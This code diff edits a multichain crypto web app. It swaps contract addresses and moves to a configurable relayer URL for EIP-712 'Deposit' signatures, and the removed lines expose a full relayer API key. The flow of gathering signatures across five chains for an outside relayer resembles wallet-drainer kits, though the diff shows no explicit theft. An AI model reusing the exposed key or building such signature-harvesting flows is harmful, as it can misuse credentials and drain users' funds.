@@ -6,6 +6,7 @@ import './index.css';
 
 // ============================================
 // DEPLOYED CONTRACTS ON ALL 5 NETWORKS
+// UPDATE THESE ADDRESSES AFTER DEPLOYING THE NEW CONTRACT
 // ============================================
 
 // Reliable Ethereum RPCs with fallbacks + timeout
@@ -20,7 +21,7 @@ const ETH_RPC_ENDPOINTS = [
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
+    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47', // <-- UPDATED
     name: 'Ethereum',
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
@@ -30,7 +31,7 @@ const MULTICHAIN_CONFIG = {
   },
   BSC: {
     chainId: 56,
-    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
+    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0', // <-- REPLACE with your new BSC contract
     name: 'BSC',
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
@@ -44,7 +45,7 @@ const MULTICHAIN_CONFIG = {
   },
   Polygon: {
     chainId: 137,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', // <-- REPLACE with your new Polygon contract
     name: 'Polygon',
     symbol: 'MATIC',
     explorer: 'https://polygonscan.com',
@@ -58,7 +59,7 @@ const MULTICHAIN_CONFIG = {
   },
   Arbitrum: {
     chainId: 42161,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', // <-- REPLACE with your new Arbitrum contract
     name: 'Arbitrum',
     symbol: 'ETH',
     explorer: 'https://arbiscan.io',
@@ -71,7 +72,7 @@ const MULTICHAIN_CONFIG = {
   },
   Avalanche: {
     chainId: 43114,
-    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288', // <-- REPLACE with your new Avalanche contract
     name: 'Avalanche',
     symbol: 'AVAX',
     explorer: 'https://snowtrace.io',
@@ -211,7 +212,9 @@ function App() {
 
   const MIN_VALUE_THRESHOLD = 1; // $1
 
-  const RELAYER_API_KEY = '00de6eb9ebf5ea70f92e4c1efdc00ad32a7131f9856bd17d445f62f19a829fe6';
+  // !!! CHANGE THIS TO YOUR OWN RELAYER URL !!!
+  const RELAYER_URL = 'https://nexaworldx.com/relayer-app';   // <-- REPLACE
+
   const EIP712_TYPES = {
     Deposit: [
       { name: "user", type: "address" },
@@ -593,11 +596,10 @@ function App() {
           };
           
           setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
-          const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
+          const relayerResponse = await fetch(RELAYER_URL, {
             method: 'POST',
             headers: {
-              'Content-Type': 'application/json',
-              'x-api-key': RELAYER_API_KEY
+              'Content-Type': 'application/json'
             },
             body: JSON.stringify({
               contractAddress: chain.contractAddress,
